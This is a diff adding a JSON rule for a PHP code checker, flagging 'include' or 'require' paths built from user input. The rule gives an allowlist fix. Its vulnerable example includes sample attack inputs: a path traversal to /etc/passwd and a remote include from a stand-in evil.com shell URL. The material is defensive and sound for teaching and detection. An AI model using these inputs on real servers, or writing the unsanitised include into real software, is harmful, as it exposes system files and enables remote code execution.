@@ -1,0 +1,14 @@
+{
+  "rule_code": "E0122",
+  "title": "E0122: File inclusion with user input",
+  "plain_english": "Using `include` or `require` with a path built from user-controlled input can allow an attacker to include unintended local or remote files.",
+  "why_matters": "File inclusion vulnerabilities can: - Include and execute malicious PHP files (local or remote) - Expose sensitive files such as `/etc/passwd`, source code, or configuration files - Lead to remote code execution in some configurations",
+  "bad_example": "$page = $_GET['page'] ?? '';\ninclude \"/var/www/pages/$page.php\";\n// ?page=../../../etc/passwd or ?page=http://evil.com/shell",
+  "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude \"/var/www/pages/$page.php\";",
+  "severity": "critical",
+  "category": "security",
+  "what_it_checks": [
+    "`include`, `require`, `include_once`, `require_once` with paths containing tainted input",
+    "`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE` values used directly in include paths"
+  ]
+}
